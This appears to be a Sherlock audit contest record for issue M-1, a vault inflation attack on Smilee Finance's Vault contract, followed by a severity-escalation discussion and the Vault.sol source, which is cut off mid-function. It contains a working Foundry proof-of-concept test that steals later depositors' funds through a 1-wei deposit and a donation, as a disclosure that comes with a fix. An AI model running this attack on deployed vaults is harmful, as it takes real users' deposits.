{
  "Title": "M-1: Vault Inflation Attack",
  "Content": "# Issue M-1: Vault Inflation Attack \n\nSource: https://github.com/sherlock-audit/2024-02-smilee-finance-judging/issues/22 \n\n## Found by \nkfx, santipu\\_\n\n## Summary\n\nAn attacker can be the first and only depositor on the vault during the first epoch in order to execute an inflation attack that will steal the deposited funds of all depositors in the next epoch. \n\n## Vulnerability Detail\n\nA malicious user can perform a donation to execute a classic first depositor/ERC4626 inflation Attack against the new Smilee vaults. The general process of this attack is well-known, and a detailed explanation of this attack can be found in many of the resources such as the following:\n\n- https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks\n- https://mixbytes.io/blog/overview-of-the-inflation-attack\n\nIn short, to kick-start the attack, the malicious user will often usually mint the smallest possible amount of shares (e.g., 1 wei) and then donate significant assets to the vault to inflate the number of assets per share. Subsequently, it will cause a rounding error when other users deposit.\n\nHowever, in Smilee there's the problem that the deposits are not processed until the epoch is finished. Therefore, the attacker would need to be the only depositor on the first epoch of the vault; after the second epoch starts, all new depositors will lose all the deposited funds due to a rounding error. \n\nThis scenario may happen for newly deployed vaults with a short maturity period (e.g., 1 day) and/or for vaults with not very popular tokens. \n\n## Impact\n\nAn attacker will steal all funds deposited by the depositors of the next epoch. \n\n## PoC\n\nThe following test can be pasted in `IGVault.t.sol` and be run with the following command: `forge test --match-test testInflationAttack`.\n\n```solidity\nfunction testInflationAttack() public {\n    // Attacker deposits 1 wei to the vault\n    VaultUtils.addVaultDeposit(bob, 1, admin, address(vault), vm);\n\n    // Next epoch...\n    Utils.skipDay(true, vm);\n    vm.prank(admin);\n    ig.rollEpoch();\n\n    // Attacker has 1 wei of shares\n    vm.prank(bob);\n    vault.redeem(1);\n    assertEq(1, vault.balanceOf(bob));\n\n    // Other users deposit liquidity (15e18)\n    VaultUtils.addVaultDeposit(alice, 10e18, admin, address(vault), vm);\n    VaultUtils.addVaultDeposit(alice, 5e18, admin, address(vault), vm);\n\n    Utils.skipDay(true, vm);\n\n    // Before rolling an epoch, the attacker donates funds to the vault to trigger rounding\n    vm.prank(admin);\n    baseToken.mint(bob, 15e18);\n    vm.prank(bob);\n    baseToken.transfer(address(vault), 15e18);\n\n    // Next epoch...\n    vm.prank(admin);\n    ig.rollEpoch();\n\n    // No new shares have been minted\n    assertEq(1, vault.totalSupply()); \n\n    // Now, attacker can withdraw all funds from the vault\n    vm.prank(bob);\n    vault.initiateWithdraw(1);\n\n    // Next epoch...\n    Utils.skipDay(true, vm);\n    vm.prank(admin);\n    ig.rollEpoch();\n\n    // The attacker withdraws all the funds (donated + stolen)\n    vm.prank(bob);\n    vault.completeWithdraw();\n    assertEq(baseToken.balanceOf(bob), 30e18 + 1);\n}\n```\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/Vault.sol#L324-L349\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nTo mitigate this issue it's recommended to enforce a minimum liquidity requirement on the deposit and withdraw functions. This way, it won't be possible to round down the new deposits. \n\n```diff\n    function deposit(uint256 amount, address receiver, uint256 accessTokenId) external isNotDead whenNotPaused {\n        // ...\n\n        _state.liquidity.pendingDeposits += amount;\n        _state.liquidity.totalDeposit += amount;\n        _emitUpdatedDepositReceipt(receiver, amount);\n        \n+       require(_state.liquidity.totalDeposit > 1e6);\n\n        // ...\n    }\n    \n    function _initiateWithdraw(uint256 shares, bool isMax) internal {\n        // ...\n\n        _state.liquidity.totalDeposit -= withdrawDepositEquivalent;\n        depositReceipt.cumulativeAmount -= withdrawDepositEquivalent;\n\n+       require(_state.liquidity.totalDeposit > 1e6 || _state.liquidity.totalDeposit == 0);\n\n        // ...\n    }\n```\n\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**panprog** commented:\n> low, because it is highly unlikely that there will be just 1 wei deposit in the first epoch. If it is, something is wrong with the vault in the first place and might be considered admin mistake.\n\n**takarez** commented:\n>  valid; first deposit attack; medium(7)\n\n\n\n**metadato-eth**\n\nSAME AS 137 and 142\nLOW\nWe agree vault inflation attack can mathematically be possible but Smilee vaults are not standard ones. \nFor this attack to happen there must be a single depositor in the very first epoch.\nFirst epoch has a custom lenght and it is used by the team simply to set up the vault and launch it with some initial capital (otherwise the IG side would have 0 notional to trade). Therefore the exploit is basically not possible.\nIn any case we implemented the fix.\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in PR/commit https://github.com/dverso/smilee-v2-contracts/commit/da38dba1ec14e7888c0e374dd325dd94339a5b5a.\n\n**panprog**\n\nFix review: Fixed\n\n**sherlock-admin4**\n\nThe Lead Senior Watson signed off on the fix.\n\n**santipu03**\n\nEscalate\n\nI think that this issue should be medium severity as it fits with the description on the [Sherlock rules](https://docs.sherlock.xyz/audits/judging/judging#v.-how-to-identify-a-medium-issue):\n> - Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The losses must exceed small, finite amount of funds, and any amount relevant based on the precision or significance of the loss.\n> - Breaks core contract functionality, rendering the contract useless or leading to loss of funds.\n\nThis issue will cause a **loss of funds**, breaking a core functionality of the protocol, as the attacker will steal the deposits of users depositing on the next epochs after the attack. Also, it **requires certain external conditions or specific states** because an attacker must be the only depositor on the first epoch (or on an epoch with 0 current liquidity). \n\nAlso, regarding the sponsor comments, there is no evidence provided to Watsons on the public domain during the audit contest period (14 Feb to 6 Mar) that states that the protocol team will perform an initial deposit on the first epoch when deploying the vault.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> I think that this issue should be medium severity as it fits with the description on the [Sherlock rules](https://docs.sherlock.xyz/audits/judging/judging#v.-how-to-identify-a-medium-issue):\n> > - Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The losses must exceed small, finite amount of funds, and any amount relevant based on the precision or significance of the loss.\n> > - Breaks core contract functionality, rendering the contract useless or leading to loss of funds.\n> \n> This issue will cause a **loss of funds**, breaking a core functionality of the protocol, as the attacker will steal the deposits of users depositing on the next epochs after the attack. Also, it **requires certain external conditions or specific states** because an attacker must be the only depositor on the first epoch (or on an epoch with 0 current liquidity). \n> \n> Also, regarding the sponsor comments, there is no evidence provided to Watsons on the public domain during the audit contest period (14 Feb to 6 Mar) that states that the protocol team will perform an initial deposit on the first epoch when deploying the vault.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nThis issue should remain low/invalid. As the sponsor said the first epoch is completely under admin control and will not be used by the user. \nYou're right that it's not written in the readme, but how is it possible that the protocol describes all possible edge cases every time? By design, this epoch will only be used by the protocol, not by users.\n\n**santipu03**\n\n@cvetanovv \n\nI may be wrong, but what I get from reading Sherlock's rules is that only the contest README has more importance than the general rules for valid issues:\n\n> Hierarchy of truth: Contest README > Sherlock rules for valid issues > protocol documentation (including code comments) > protocol answers on the contest public Discord channel.\nWhile considering the validity of an issue in case of any conflict the sources of truth are prioritized in the above order.\n\nTherefore, if I'm not missing something, this issue should be considered valid because the sponsor's mitigation wasn't mentioned on the README. \n\n\n\n**nevillehuang**\n\nAgree with @santipu03 unless such mitigations is explicitly mentioned in the known issue section, any possible mitigation would be an assumption, and so this issue should remain as valid medium, of course unless there is sufficient information to back up the intended mitigation mentioned by sponsor.\n\n**Czar102**\n\nUnless the sponsor has communicated these plans during the time of the audit, I'm planning to accept the escalation and make this a valid Medium.\n\n@cvetanovv @nevillehuang @santipu03 Is only #137 a duplicate of this issue? I can see that the duplication status on #142  is disputed, it will be considered separately.\n\n**nevillehuang**\n\n@Czar102 Yes to my knowledge, only #137 qualifies as an duplicate. #142 should be a separate issue to be considered\n\n**0xjuaan**\n\nHmm, isn't this low severity since it requires that throughout the first epoch, nobody deposits other than the attacker?\n\nA normal vault inflation attack can be considered H/M since the attacker would simply need to be the first depositor and this can be achieved through front-running.\n\nHowever this attack would require them to be the only depositor within the first epoch, which has can last 1 day, or even 1 month in some cases- so to me it seems like the likelihood would bring it to low severity, but of course I will respect the judge's decision.\n\n**Czar102**\n\n> However this attack would require them to be the only depositor within the first epoch, which has can last 1 day, or even 1 month in some cases- so to me it seems like the likelihood would bring it to low severity, but of course I will respect the judge's decision.\n\nIndeed, but there are cases when the attacker being the only depositor is plausible. Because of that, I think Medium severity is appropriate.\n\nPlanning to accept the escalation and make this issue a valid Medium. #137 will be a duplicate, status of #142 is TBD.\n\n**Czar102**\n\nResult:\nMedium\nHas duplicates\n\nOnly #137 is a duplicate.\n\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [santipu03](https://github.com/sherlock-audit/2024-02-smilee-finance-judging/issues/22/#issuecomment-2004201315): accepted\n\n**0xMR0**\n\n> Result: Medium Has duplicates\n> \n> Only #137 is a duplicate.\n\n@Czar102 `Has Duplicates` label is missed for this issue\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/180",
  "Code": [
    {
      "filename": "smilee-v2-contracts/src/Vault.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.15;\n\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {AccessControl} from \"@openzeppelin/contracts/access/AccessControl.sol\";\nimport {Pausable} from \"@openzeppelin/contracts/security/Pausable.sol\";\nimport {IERC20Metadata} from \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\nimport {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport {IAddressProvider} from \"./interfaces/IAddressProvider.sol\";\nimport {IExchange} from \"./interfaces/IExchange.sol\";\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {IVaultAccessNFT} from \"./interfaces/IVaultAccessNFT.sol\";\nimport {IVaultParams} from \"./interfaces/IVaultParams.sol\";\nimport {Epoch, EpochController} from \"./lib/EpochController.sol\";\nimport {TokensPair} from \"./lib/TokensPair.sol\";\nimport {VaultLib} from \"./lib/VaultLib.sol\";\nimport {EpochControls} from \"./EpochControls.sol\";\n\ncontract Vault is IVault, ERC20, EpochControls, AccessControl, Pausable {\n    using VaultLib for VaultLib.DepositReceipt;\n    using EpochController for Epoch;\n    using SafeERC20 for IERC20;\n\n    /// @inheritdoc IVaultParams\n    address public immutable baseToken;\n\n    /// @inheritdoc IVaultParams\n    address public immutable sideToken;\n\n    /// @notice The address of the DVP paired with this vault\n    address public dvp; // NOTE: public for frontend purposes\n    bool internal _dvpSet;\n\n    /// @notice Maximum threshold for users cumulative deposit (see VaultLib.VaultState.liquidity.totalDeposit)\n    uint256 public maxDeposit;\n\n    uint8 internal immutable _shareDecimals;\n\n    /// @inheritdoc IVault\n    mapping(address => VaultLib.DepositReceipt) public depositReceipts;\n\n    /// @inheritdoc IVault\n    mapping(address => VaultLib.Withdrawal) public withdrawals;\n\n    mapping(uint256 => uint256) public epochPricePerShare; // NOTE: public for frontend and historical data purposes\n\n    VaultLib.VaultState internal _state;\n\n    /// @notice The provider for external services addresses\n    IAddressProvider internal immutable _addressProvider;\n\n    /// @notice Flag to tell if this vault is currently bound to priority access for deposits\n    bool public priorityAccessFlag;\n\n    /// @notice Tolerance margin when buying side tokens exceeds the availability (in basis points [0 - 10000])\n    uint256 internal _hedgeMargin;\n\n    bytes32 public constant ROLE_GOD = keccak256(\"ROLE_GOD\");\n    bytes32 public constant ROLE_ADMIN = keccak256(\"ROLE_ADMIN\");\n    bytes32 public constant ROLE_EPOCH_ROLLER = keccak256(\"ROLE_EPOCH_ROLLER\");\n\n    error AddressZero();\n    error AmountZero();\n    error DVPAlreadySet();\n    error DVPNotSet();\n    error ExceedsAvailable(); // raised when a user tries to move more assets than allowed to or owned\n    error ExceedsMaxDeposit();\n    error ExistingIncompleteWithdraw();\n    error OnlyDVPAllowed();\n    error PriorityAccessDenied();\n    error VaultDead();\n    error VaultNotDead();\n    error WithdrawNotInitiated();\n    error WithdrawTooEarly();\n    error InsufficientLiquidity(bytes4); // raise when accounting operations would break the system due to lack of liquidity\n    error FailingDeltaHedge();\n\n    event Deposit(uint256 amount);\n    event Redeem(uint256 amount);\n    event InitiateWithdraw(uint256 amount);\n    event Withdraw(uint256 amount);\n    // Used by TheGraph for frontend needs:\n    event VaultTVL(uint256 epoch, uint256 value);\n    event MissingLiquidity(uint256 missing);\n    event ChangedHedgeMargin(uint256 basisPoints);\n    event Killed();\n    event ChangedPauseState(bool paused);\n    error OutOfAllowedRange();\n\n    constructor(\n        address baseToken_,\n        address sideToken_,\n        uint256 epochFrequency_,\n        uint256 firstEpochTimespan,\n        address addressProvider_\n    ) ERC20(\"Smilee Share\", \":)\") EpochControls(epochFrequency_, firstEpochTimespan) AccessControl() Pausable() {\n        TokensPair.validate(TokensPair.Pair({baseToken: baseToken_, sideToken: sideToken_}));\n        baseToken = baseToken_;\n        sideToken = sideToken_;\n\n        // Shares have the same number of decimals as the base token\n        _shareDecimals = IERC20Metadata(baseToken).decimals();\n\n        _addressProvider = IAddressProvider(addressProvider_);\n        maxDeposit = 1_000_000_000 * (10 ** _shareDecimals);\n\n        _hedgeMargin = 250; // 2.5 %\n        priorityAccessFlag = false;\n        _dvpSet = false;\n\n        _setRoleAdmin(ROLE_GOD, ROLE_GOD);\n        _setRoleAdmin(ROLE_ADMIN, ROLE_GOD);\n        _setRoleAdmin(ROLE_EPOCH_ROLLER, ROLE_ADMIN);\n\n        _grantRole(ROLE_GOD, msg.sender);\n    }\n\n    function decimals() public view override returns (uint8) {\n        return _shareDecimals;\n    }\n\n    modifier isNotDead() {\n        if (_state.dead) {\n            revert VaultDead();\n        }\n        _;\n    }\n\n    modifier isDead() {\n        if (!_state.dead) {\n            revert VaultNotDead();\n        }\n        _;\n    }\n\n    modifier onlyDVP() {\n        if (!_dvpSet) {\n            revert DVPNotSet();\n        }\n        if (msg.sender != dvp) {\n            revert OnlyDVPAllowed();\n        }\n        _;\n    }\n\n    /**\n        @notice Allows the contract's owner to set the DVP paired with this vault\n        @dev The address is injected after-build, because the DVP needs an already built vault as constructor-injected dependency\n     */\n    function setAllowedDVP(address dvp_) external {\n        _checkRole(ROLE_ADMIN);\n\n        if (_dvpSet) {\n            revert DVPAlreadySet();\n        }\n\n        dvp = dvp_;\n        _dvpSet = true;\n\n        _grantRole(ROLE_EPOCH_ROLLER, dvp_);\n    }\n\n    /**\n        @notice Set the tolerated hedge margin\n        @param hedgeMargin The number of basis points (10000 is 100%)\n     */\n    function setHedgeMargin(uint256 hedgeMargin) external {\n        _checkRole(ROLE_ADMIN);\n        // Cap is 10%\n        if (hedgeMargin > 1000) {\n            revert OutOfAllowedRange();\n        }\n\n        _hedgeMargin = hedgeMargin;\n\n        emit ChangedHedgeMargin(hedgeMargin);\n    }\n\n    /**\n        @notice Set maximum deposit capacity for the Vault\n        @param maxDeposit_ The number of base tokens\n     */\n    function setMaxDeposit(uint256 maxDeposit_) external {\n        _checkRole(ROLE_ADMIN);\n\n        maxDeposit = maxDeposit_;\n    }\n\n    function killVault() external {\n        _checkRole(ROLE_ADMIN);\n\n        _state.killed = true;\n\n        emit Killed();\n    }\n\n    function vaultState()\n        external\n        view\n        returns (\n            uint256 lockedLiquidityInitially,\n            uint256 pendingDeposit,\n            uint256 totalWithdrawAmount,\n            uint256 pendingPayoffs,\n            uint256 totalDeposit,\n            uint256 queuedWithdrawShares,\n            uint256 currentQueuedWithdrawShares,\n            bool dead_,\n            bool killed\n        )\n    {\n        return (\n            _state.liquidity.lockedInitially,\n            _state.liquidity.pendingDeposits,\n            _state.liquidity.pendingWithdrawals,\n            _state.liquidity.pendingPayoffs,\n            _state.liquidity.totalDeposit,\n            _state.withdrawals.heldShares,\n            _state.withdrawals.newHeldShares,\n            _state.dead,\n            _state.killed\n        );\n    }\n\n    /// @inheritdoc IVault\n    function balances() public view returns (uint256 baseTokenAmount, uint256 sideTokenAmount) {\n        baseTokenAmount = _notionalBaseTokens();\n        sideTokenAmount = _notionalSideTokens();\n    }\n\n    /**\n        @notice Provides the total portfolio value in base tokens\n        @return value The total portfolio value in base tokens\n     */\n    function notional() public view returns (uint256) {\n        address exchangeAddress = _addressProvider.exchangeAdapter();\n        if (exchangeAddress == address(0)) {\n            revert AddressZero();\n        }\n        IExchange exchange = IExchange(exchangeAddress);\n\n        uint256 baseTokens = _notionalBaseTokens();\n        uint256 sideTokens = _notionalSideTokens();\n        uint256 valueOfSideTokens = exchange.getOutputAmount(sideToken, baseToken, sideTokens);\n\n        return baseTokens + valueOfSideTokens;\n    }\n\n    /**\n        @notice Provides the current amount of base tokens available for DVP operations in the current epoch.\n        @return amount_ The current amount of available base tokens\n        @dev In the current epoch, that amount is everything except the amounts putted aside.\n     */\n    function _notionalBaseTokens() internal view returns (uint256 amount_) {\n        (uint256 baseTokens, ) = _tokenBalances();\n\n        uint256 pendings = _state.liquidity.pendingWithdrawals +\n            _state.liquidity.pendingDeposits +\n            _state.liquidity.pendingPayoffs;\n\n        // Just catching the underflow and reverting with a more explicit error (see [IL-NOTE])\n        if (baseTokens < pendings) {\n            revert InsufficientLiquidity(bytes4(keccak256(\"_notionalBaseTokens()\")));\n        }\n\n        return baseTokens - pendings;\n    }\n\n    /**\n        @notice Provides the amount of side tokens from the portfolio of the current epoch.\n        @return amount_ The amount of side tokens\n     */\n    function _notionalSideTokens() internal view returns (uint256 amount_) {\n        (, amount_) = _tokenBalances();\n    }\n\n    function _tokenBalances() internal view returns (uint256 baseTokens, uint256 sideTokens) {\n        baseTokens = IERC20(baseToken).balanceOf(address(this));\n        sideTokens = IERC20(sideToken).balanceOf(address(this));\n    }\n\n    /// @inheritdoc IVault\n    function v0() public view virtual returns (uint256) {\n        return _state.liquidity.lockedInitially;\n    }\n\n    /// @inheritdoc IVault\n    function dead() external view returns (bool) {\n        return _state.killed;\n    }\n\n    /**\n        @notice Pause/Unpause\n     */\n    function changePauseState() external {\n        _checkRole(ROLE_ADMIN);\n\n        bool paused = paused();\n\n        if (paused) {\n            _unpause();\n        } else {\n            _pause();\n        }\n\n        emit ChangedPauseState(!paused);\n    }\n\n    /**\n        @notice Allows the contract's owner to enable or disable the priority access to deposit operations\n     */\n    function setPriorityAccessFlag(bool flag) external {\n        _checkRole(ROLE_ADMIN);\n\n        priorityAccessFlag = flag;\n    }\n\n    // ------------------------------------------------------------------------\n    // USER OPERATIONS\n    // ------------------------------------------------------------------------\n\n    /// @inheritdoc IVault\n    function deposit(uint256 amount, address receiver, uint256 accessTokenId) external isNotDead whenNotPaused {\n        _checkEpochNotFinished();\n\n        if (amount == 0) {\n            revert AmountZero();\n        }\n\n        // Avoids underflows when the maxDeposit is setted below than the totalDeposit\n        if (_state.liquidity.totalDeposit > maxDeposit) {\n            revert ExceedsMaxDeposit();\n        }\n\n        if (amount > maxDeposit - _state.liquidity.totalDeposit) {\n            revert ExceedsMaxDeposit();\n        }\n\n        _usePriorityAccess(amount, receiver, accessTokenId);\n\n        _state.liquidity.pendingDeposits += amount;\n        _state.liquidity.totalDeposit += amount;\n        _emitUpdatedDepositReceipt(receiver, amount);\n\n        IERC20(baseToken).safeTransferFrom(msg.sender, address(this), amount);\n\n        emit Deposit(amount);\n    }\n\n    /**\n        @notice Create or update a deposit receipt for a given deposit operation.\n        @param creditor The wallet of the creditor\n        @param amount The deposited amount\n        @dev The deposit receipt allows the creditor to redeem its shares or withdraw liquidity.\n     */\n    function _emitUpdatedDepositReceipt(address creditor, uint256 amount) internal {\n        VaultLib.DepositReceipt storage depositReceipt = depositReceipts[creditor];\n        Epoch memory epoch = getEpoch();\n\n        // Get the number of unredeemed shares from previous deposits, if any.\n        // NOTE: the amount of unredeemed shares is the one of the previous epochs, as we still don't know the share price.\n        uint256 unredeemedShares = depositReceipt.getSharesFromReceipt(\n            epoch.current,\n            epochPricePerShare[depositReceipt.epoch],\n            _shareDecimals\n        );\n\n        // If the user has already deposited in the current epoch, add the amount to the total one of the next epoch:\n        if (epoch.current == depositReceipt.epoch) {\n            depositReceipt.amount = depositReceipt.amount + amount;\n        } else {\n            depositReceipt.amount = amount;\n        }\n\n        depositReceipt.epoch = epoch.current;\n        depositReceipt.cumulativeAmount = depositReceipt.cumulativeAmount + amount;\n        depositReceipt.unredeemedShares = unredeemedShares;\n    }\n\n    /**\n        @notice Get wallet balance of actual owned shares and owed shares.\n        @return heldByAccount The amount of shares owned by the wallet\n        @return heldByVault The amount of shares owed to the wallet\n     */\n    function shareBalances(address account) public view returns (uint256 heldByAccount, uint256 heldByVault) {\n        VaultLib.DepositReceipt memory depositReceipt = depositReceipts[account];\n\n        if (depositReceipt.epoch == 0) {\n            return (0, 0);\n        }\n\n        heldByAccount = balanceOf(account);\n\n        heldByVault = depositReceipt.getSharesFromReceipt(\n            getEpoch().current,\n            epochPricePerShare[depositReceipt.epoch],\n            _shareDecimals\n        );\n    }\n\n    /**\n        @notice Redeems shares held by the vault for the calling wallet\n        @param shares is the number of shares to redeem\n     */\n    function redeem(uint256 shares) external whenNotPaused {\n        if (shares == 0) {\n            revert AmountZero();\n        }\n        // NOTE: if the epoch has not been initialized, it reverts with ExceedsAvailable.\n        _redeem(shares, false);\n    }\n\n    function _redeem(uint256 shares, bool isMax) internal {\n        VaultLib.DepositReceipt storage depositReceipt = depositReceipts[msg.sender];\n        Epoch memory epoch = getEpoch();\n\n        uint256 unredeemedShares = depositReceipt.getSharesFromReceipt(\n            epoch.current,\n            epochPricePerShare[depositReceipt.epoch],\n            _shareDecimals\n        );\n\n        if (!isMax && shares > unredeemedShares) {\n            revert ExceedsAvailable();\n        }\n\n        if (isMax) {\n            shares = unredeemedShares;\n        }\n\n        if (shares == 0) {\n            return;\n        }\n\n        if (depositReceipt.epoch < epoch.current) {\n            // NOTE: all the amount - if any - has already been converted in unredeemedShares.\n            depositReceipt.amount = 0;\n        }\n\n        depositReceipt.unredeemedShares = unredeemedShares - shares;\n\n        _transfer(address(this), msg.sender, shares);\n\n        emit Redeem(shares);\n    }\n\n    /// @inheritdoc IVault\n    function initiateWithdraw(uint256 shares) external whenNotPaused isNotDead {\n        _checkEpochNotFinished();\n\n        _initiateWithdraw(shares, false);\n    }\n\n    function _initiateWithdraw(uint256 shares, bool isMax) internal {\n        // We take advantage of this flow in order to also transfer any unredeemed share to the user.\n        _redeem(0, true);\n        // NOTE: since we made a 'redeem all', from now on all the user's shares are owned by him.\n        uint256 userShares = balanceOf(msg.sender);\n\n        if (isMax) {\n            shares = userShares;\n        }\n\n        if (shares == 0) {\n            revert AmountZero();\n        }\n\n        if (shares > userShares) {\n            revert ExceedsAvailable();\n        }\n\n        Epoch memory epoch = getEpoch();\n        VaultLib.Withdrawal storage withdrawal = withdrawals[msg.sender];\n\n        // If there is a pre-ordered withdrawal in the past, the user must first complete it.\n        if (withdrawal.epoch < epoch.current && withdrawal.shares > 0) {\n            revert ExistingIncompleteWithdraw();\n        }\n\n        // Update user withdrawal receipt:\n        // NOTE: the withdrawal.shares value is zeroed when the user complete a withdraw.\n        // NOTE: if there is a pre-ordered withdrawal in the current epoch, it is increased; otherwise it starts from zero.\n        withdrawal.shares = withdrawal.shares + shares;\n        withdrawal.epoch = epoch.current;\n\n        // -----------------------------\n        // A withdrawal pre-order free space for further deposits, hence we must\n        // update the vault capacity.\n        //\n        // The deposit receipt must also be updated in order to correctly update\n        // the vault total deposits, shall the user initiate other withdrawal\n        // pre-orders in the same epoch (as it is used for such computation).\n        //\n        // Steps:\n        //   - estimate the increased capacity by computing the following proportion:\n        //       withdrawed_shares : user_shares = x : user_deposits\n        //   - use the found number for decreasing the current number of deposits.\n        //   - update the user's deposit receipt [cumulativeAmount] value.\n        VaultLib.DepositReceipt storage depositReceipt = depositReceipts[msg.sender];\n        // NOTE: the user deposits to consider are only the ones for which a share has been minted.\n        uint256 userDeposits = depositReceipt.cumulativeAmount;\n        if (depositReceipt.epoch == epoch.current) {\n            userDeposits -= depositReceipt.amount;\n        }\n\n        uint256 withdrawDepositEquivalent = (userDeposits * shares) / userShares;\n\n        _state.liquidity.totalDeposit -= withdrawDepositEquivalent;\n        depositReceipt.cumulativeAmount -= withdrawDepositEquivalent;\n        // -----------------------------\n\n        _state.withdrawals.newHeldShares += shares;\n\n        _transfer(msg.sender, address(this), shares);\n\n        emit InitiateWithdraw(shares);\n    }\n\n    /**\n        @notice Completes a scheduled withdrawal from a past epoch. Uses finalized share price for the epoch.\n     */\n    function completeWithdraw() external whenNotPaused {\n        VaultLib.Withdrawal storage withdrawal = withdrawals[msg.sender];\n\n        // Checks if there is an initiated withdrawal request\n        if (withdrawal.shares == 0) {\n            revert WithdrawNotInitiated();\n        }\n\n        // At least one epoch must have passed since the start of the withdrawal\n        if (withdrawal.epoch == getEpoch().current) {\n            revert WithdrawTooEarly();\n        }\n\n        _completeWithdraw();\n    }\n\n    function _completeWithdraw() internal {\n        VaultLib.Withdrawal storage withdrawal = withdrawals[msg.sender];\n\n        uint256 pricePerShare = epochPricePerShare[withdrawal.epoch];\n        uint256 amountToWithdraw = VaultLib.sharesToAsset(withdrawal.shares, pricePerShare, _shareDecimals);\n\n        // NOTE: the user transferred the required shares to the vault when (s)he initiated the withdraw\n        _state.withdrawals.heldShares -= withdrawal.shares;\n        _state.liquidity.pendingWithdrawals -= amountToWithdraw;\n\n        uint256 sharesToWithdraw = withdrawal.shares;\n        withdrawal.shares = 0;\n        _burn(address(this), sharesToWithdraw);\n        IERC20(baseToken).safeTransfer(msg.sender, amountToWithdraw);\n\n        emit Withdraw(amountToWithdraw);\n    }\n\n    function rescueShares() external isDead whenNotPaused {\n        VaultLib.Withdrawal storage withdrawal = withdrawals[msg.sender];\n        // If an uncompleted withdraw exists, complete it before starting a new one.\n        if (withdrawal.shares > 0) {\n            _completeWithdraw();\n        }\n\n        // NOTE: it will revert if there are no shares to further withdraw.\n        _initiateWithdraw(0, true);\n\n        // NOTE: due to the missing roll-epoch between the two withdraw phases, we have to:\n        //       - account the withdrawed shares as held.\n        //       - account the new pendingWithdrawals; due to the dead vault, we have to use the last price per share.\n        _state.withdrawals.newHeldShares -= withdrawal.shares;\n        _state.withdrawals.heldShares += withdrawal.shares;\n        Epoch memory epoch = getEpoch();\n        uint256 pricePerShare = epochPricePerShare[epoch.previous];\n        uint256 newPendingWithdrawals = VaultLib.sharesToAsset(withdrawal.shares, pricePerShare, _shareDecimals);\n        _state.liquidity.pendingWithdrawals += newPendingWithdrawals;\n\n        // NOTE: as the withdrawal.epoch is the epoch.current one, we also have to fake it in order to use the right price per share.\n        withdrawal.epoch = epoch.previous;\n\n        _completeWithdraw();\n    }\n\n    // ------------------------------------------------------------------------\n    // VAULT OPERATIONS\n    // ------------------------------------------------------------------------\n\n    /// @inheritdoc EpochControls\n    function _beforeRollEpoch() internal virtual override isNotDead {\n        _checkRole(ROLE_EPOCH_ROLLER);\n\n        if (_state.killed) {\n            // Sell all sideToken to be able to pay all the withdraws initiated after manual kill.\n            (, uint256 sideTokens) = _tokenBalances();\n            _sellSideTokens(sideTokens);\n            _state.dead = true;\n        }\n\n        uint256 lockedLiquidity = notional();\n\n        // [IL-NOTE]\n        // In rare scenarios (ex. roundings or very tiny TVL vaults with high impact swap slippage) there can be small losses in a single epoch.\n        // As a precautionary design we plan to revert and have the protocol DAO / admin cover such tiny amount.\n        // Managing such scenarios at code level would increase codebase complexity without bringing any real benefit to the protocol.\n        if (lockedLiquidity < _state.liquidity.newPendingPayoffs) {\n            revert InsufficientLiquidity(\n                bytes4(keccak256(\"_beforeRollEpoch()::lockedLiquidity <= _state.liquidity.newPendingPayoffs\"))\n            );\n        }\n\n        // NOTE: the share price needs to account also the payoffs\n        lockedLiquidity -= _state.liquidity.newPendingPayoffs;\n\n        // Computes the share price for the ending epoch:\n        // - heldShares are the ones given back to the Vault in exchange of withdrawed tokens\n        // - lockedLiquidity is the DVP portfolio value at the end of the epoch\n        uint256 outstandingShares = totalSupply() - _state.withdrawals.heldShares;\n\n        // NOTE: the share price cannot go to zero unless `_state.liquidity.newPendingPayoffs` is exactly equal to `lockedLiquidity`\n        // - when all the locked liquidity is set aside for (pending) withdrawals and payoffs (lockedLiquidity = 0, we revert)\n        // - when everyone withdrew, or during first epoch, `outstandingShares` is 0 -> sharePrice = 1\n        uint256 sharePrice = VaultLib.pricePerShare(lockedLiquidity, outstandingShares, _shareDecimals);\n        epochPricePerShare[getEpoch().current] = sharePrice;\n\n        // NOTE: if for any reason lockedLiquidity results in 0 we avoid new depositors to receive no shares\n        if (sharePrice == 0) {\n            revert InsufficientLiquidity(bytes4(keccak256(\"_beforeRollEpoch()::sharePrice == 0\")));\n        }\n\n        // Increase shares hold due to initiated withdrawals:\n        _state.withdrawals.heldShares += _state.withdrawals.newHeldShares;\n\n        // Reserve the liquidity needed to cover the withdrawals initiated in the current epoch:\n        // NOTE: here we just account the amounts and we delay all the actual swaps to the final one in order to optimize them\n        // NOTE: if sharePrice is zero, the users will receive zero from withdrawals\n        uint256 newPendingWithdrawals = VaultLib.sharesToAsset(\n            _state.withdrawals.newHeldShares,\n            sharePrice,\n            _shareDecimals\n        );\n        _state.liquidity.pendingWithdrawals += newPendingWithdrawals;\n        // Cannot underflow since share price is computed taking into account residual lockedLiquidity\n        lockedLiquidity -= newPendingWithdrawals;\n\n        // Reset the counter for the next epoch:\n        // NOTE: the held shares are burned when withdrawals are completed\n        _state.withdrawals.newHeldShares = 0;\n\n        // Set aside the payoff to be paid:\n        _state.liquidity.pendingPayoffs += _state.liquidity.newPendingPayoffs;\n        _state.liquidity.newPendingPayoffs = 0;\n\n        // Mint shares related to new deposits 